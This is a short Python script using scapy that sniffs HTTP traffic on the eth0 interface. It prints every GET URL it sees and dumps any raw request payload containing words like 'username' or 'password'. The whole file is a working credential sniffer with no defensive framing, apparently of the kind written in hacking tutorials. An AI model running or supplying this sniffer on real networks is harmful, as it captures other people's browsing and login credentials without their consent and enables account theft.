#!/usr/bin/python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    if packet[http.HTTPRequest].Method.decode('utf-8').lower() == 'get':
        Domain = packet[http.HTTPRequest].Host
        PATH = packet[http.HTTPRequest].Path
        URL = (Domain + PATH).decode('utf-8')
        return URL

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        keywords = ['username', 'uname', 'password', 'pass', 'USERNAME', 'UNAME', 'PASSWORD', 'PASS']
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            print('\n\n\n[+] Visited URL is: ' + str(url) + '\n\n')
        login_creds = get_login_info(packet)
        if login_creds:
            print('\n\n\n[+] Possible Username/Password: ' + login_creds + '\n\n')
sniff('eth0')
